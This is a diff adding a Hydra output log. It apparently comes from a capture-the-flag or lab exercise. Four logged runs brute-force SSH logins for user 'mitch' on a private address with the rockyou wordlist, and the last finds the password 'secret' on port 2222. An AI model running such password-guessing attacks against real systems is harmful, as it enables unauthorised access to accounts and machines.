@@ -1,0 +1,5 @@
+# Hydra v9.5 run at 2025-07-13 23:25:30 on 10.10.82.195 ssh (hydra -l mitch -p /usr/share/wordlists/rockyou.txt -t 4 -v -o hydra_ssh.txt ssh://10.10.82.195)
+# Hydra v9.5 run at 2025-07-13 23:25:59 on 10.10.82.195 ssh (hydra -l mitch -p /usr/share/wordlists/rockyou.txt -p 2222 -t 4 -v -o hydra_ssh.txt ssh://10.10.82.195)
+# Hydra v9.5 run at 2025-07-13 23:26:10 on 10.10.82.195 ssh (hydra -l mitch -p /usr/share/wordlists/rockyou.txt -t 4 -v -o hydra_ssh.txt ssh://10.10.82.195:2222)
+# Hydra v9.5 run at 2025-07-13 23:26:22 on 10.10.82.195 ssh (hydra -l mitch -P /usr/share/wordlists/rockyou.txt -t 4 -v -o hydra_ssh.txt ssh://10.10.82.195:2222)
+[2222][ssh] host: 10.10.82.195   login: mitch   password: secret
